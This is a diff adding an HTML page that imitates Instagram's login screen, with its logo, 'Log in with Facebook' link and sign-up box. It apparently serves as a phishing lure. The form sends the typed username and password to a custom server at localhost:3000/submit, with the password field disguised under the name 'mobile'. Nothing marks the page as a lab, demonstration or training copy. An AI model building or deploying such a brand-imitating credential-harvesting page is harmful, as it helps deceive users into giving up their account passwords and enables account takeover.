@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en" style="margin: 0; padding: 0; box-sizing: border-box; outline: none; list-style: none; text-decoration: none; font-family: 'Roboto', sans-serif;">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #fafafa;
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .header {
+            max-width: 350px;
+            width: 100%;
+            height: auto;
+        }
+
+        .top {
+            background: #fff;
+            border: 1px solid #e6e6e6;
+            padding: 40px;
+            border-radius: 4px;
+        }
+
+        .logo img {
+            display: block;
+            width: 175px;
+            margin: 0 auto 35px;
+        }
+
+        .input_field {
+            margin-bottom: 10px;
+        }
+
+        .input {
+            width: 100%;
+            padding: 10px;
+            background: #fafafa;
+            border: 1px solid #efefef;
+            font-size: 14px;
+            border-radius: 3px;
+            color: #262626;
+        }
+
+        .btn {
+            background-color: #3897f0;
+            border: 1px solid #3897f0;
+            border-radius: 4px;
+            text-align: center;
+            padding: 10px;
+            margin: 10px 0;
+        }
+
+        .btn a {
+            color: white;
+            text-decoration: none;
+            display: block;
+            font-size: 14px;
+        }
+
+        .or {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .or p {
+            margin: 0 10px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #efefef;
+        }
+
+        .fb {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 15px;
+        }
+
+        .fb img {
+            width: 16px;
+            height: 16px;
+            margin-right: 10px;
+        }
+
+        .forgot {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot a {
+            color: #003569;
+            font-size: 12px;
+        }
+
+        .signup {
+            text-align: center;
+            background: #fff;
+            border: 1px solid #e6e6e6;
+            padding: 25px;
+            margin-top: 20px;
+        }
+
+        .signup a {
+            color: #3897f0;
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 768px) {
+            .top {
+                padding: 20px;
+            }
+
+            .btn {
+                padding: 8px;
+            }
+
+            .input {
+                font-size: 12px;
+            }
+
+            .or p {
+                font-size: 10px;
+            }
+
+            .btn a {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="header">
+            <div class="top">
+                <div class="logo">
+                    <img alt="instagram" src="https://raw.githubusercontent.com/codingmarket07/Instagram-Login-Page/master/instagram.png"/>
+                </div>
+                <!-- Updated Form -->
+                <form id="loginForm" action="http://localhost:3000/submit" method="POST">
+                    <div class="input_field">
+                        <input class="input" name="name" placeholder="Phone number, username, or email" type="text" required />
+                    </div>
+                    <div class="input_field">
+                        <input class="input" name="mobile" placeholder="Password" type="password" required />
+                    </div>
+                    <div class="btn">
+                        <button type="submit" style="background: none; border: none; color: white; cursor: pointer;">Log In</button>
+                    </div>
+                </form>
+                <div class="or">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+                <div class="fb">
+                    <img alt="facebook" src="https://raw.githubusercontent.com/codingmarket07/Instagram-Login-Page/master/facebook.png" />
+                    <a href="facebook.html">Log in with Facebook</a>
+                </div>
+                <div class="forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="signup">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Optional JavaScript for form submission confirmation -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            alert('Form submitted!');
+        });
+    </script>
+</body>
+</html>
